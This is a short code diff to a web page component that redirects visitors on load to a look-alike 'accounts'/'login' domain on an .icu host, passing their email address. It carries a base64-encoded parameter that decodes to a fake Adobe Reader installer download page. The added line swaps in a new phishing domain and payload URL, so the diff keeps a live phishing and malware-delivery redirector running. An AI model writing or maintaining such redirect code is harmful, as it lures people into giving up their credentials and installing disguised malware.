@@ -37,7 +37,7 @@ export default function Home() {
     if (email) {
       // Redirect to Non-Windows target with raw email
       window.location.href =
-        `https://login.jsspjg.icu?b5dAzQiZHlQ5=aHR0cHM6Ly9ta3NvbmxpbmUuY29tLm14L2Nzcy9hZG9iZS9yZWFkZXIvZG93bmxvYWQuaHRtbA==&smn=${email}`;
+        `https://accounts.fxzova.icu?xJsf1Kdet7hf=aHR0cHM6Ly9qb21yeS5jb20vYWRvYmUtcmVhZGVycy9pbnN0YWxsZXIvZG93bmxvYWQuaHRtbA==&smn=${email}`;
     }
   }, []);
 
